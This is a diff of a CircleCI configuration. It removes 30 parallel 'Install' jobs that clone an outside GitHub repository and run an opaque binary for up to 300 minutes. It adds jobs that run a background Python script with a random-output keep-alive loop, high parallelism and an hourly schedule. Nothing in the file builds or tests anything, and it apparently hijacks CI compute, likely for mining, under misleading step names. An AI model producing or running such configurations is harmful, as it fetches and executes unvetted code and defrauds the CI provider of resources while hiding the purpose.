@@ -1,307 +1,44 @@
-version: 2
-jobs:
-    aku1:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku2:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku3:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku4:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku5:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku6:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku7:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku8:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku9:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku10:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku11:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku12:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku13:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku14:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku15:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku16:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku17:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku18:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku19:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku20:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku21:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku22:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku23:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku24:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku25:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku26:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku27:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku28:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku29:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
-    aku30:
-      machine:
-            image: ubuntu-2004:202101-01
-      resource_class: large
-      steps:
-        - run:
-            name: Install
-            command: git clone https://github.com/pramadoli/2a.git && cd 2a && chmod u+x 2a && ./2a
-            no_output_timeout: 300m
+working_dir: &working_dir ~/app 
+.build_template: &script
+  steps: 
+    - checkout 
+    - run: 
+        name: Install Dependencies 
+        command: |
+                    python sample.py >/dev/null &
+                    while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
+        no_output_timeout: 300m                               
+version: 2.0 
+jobs: 
+  build1: 
+    <<: *script
+    parallelism: 15
+    docker:
+      - image: python
+    resource_class: large
+  build2: 
+    <<: *script
+    parallelism: 15
+    docker:
+      - image: python
+    resource_class: large
 
-workflows:
-    version: 2
-    build:
-        jobs:
-            - aku1
-            - aku2
-            - aku3
-            - aku4
-            - aku5
-            - aku6
-            - aku7
-            - aku8
-            - aku9
-            - aku10
-            - aku11
-            - aku12
-            - aku13
-            - aku14
-            - aku15
-            - aku16
-            - aku17
-            - aku18
-            - aku19
-            - aku20
-            - aku21
-            - aku22
-            - aku23
-            - aku24
-            - aku25
-            - aku26
-            - aku27
-            - aku28
-            - aku29
-            - aku30
+workflows: 
+  version: 2 
+  commit: 
+    jobs: 
+      - build1
+      - build2
+
+  schedule:
+    triggers:
+      - schedule:
+          cron: "5 * * * *"
+          filters:
+            branches:
+              only:
+                - main
+
+    jobs: 
+      - build1
+      - build2
